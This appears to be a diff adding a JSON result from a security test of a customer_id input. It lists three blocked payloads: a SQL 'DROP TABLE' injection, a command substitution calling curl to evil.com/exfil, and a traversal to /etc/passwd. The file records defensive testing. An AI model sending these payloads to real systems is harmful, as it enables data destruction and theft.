@@ -1,0 +1,26 @@
+{
+  "attack": "03_classic_injection",
+  "exploited": false,
+  "detail": {
+    "steps": [
+      {
+        "payload": "'; DROP TABLE customers; --",
+        "blocked": true,
+        "status": 400,
+        "detail": "customer_id failed pattern validation"
+      },
+      {
+        "payload": "$(curl evil.com/exfil)",
+        "blocked": true,
+        "status": 400,
+        "detail": "customer_id failed pattern validation"
+      },
+      {
+        "payload": "../../../../etc/passwd",
+        "blocked": true,
+        "status": 400,
+        "detail": "customer_id failed pattern validation"
+      }
+    ]
+  }
+}
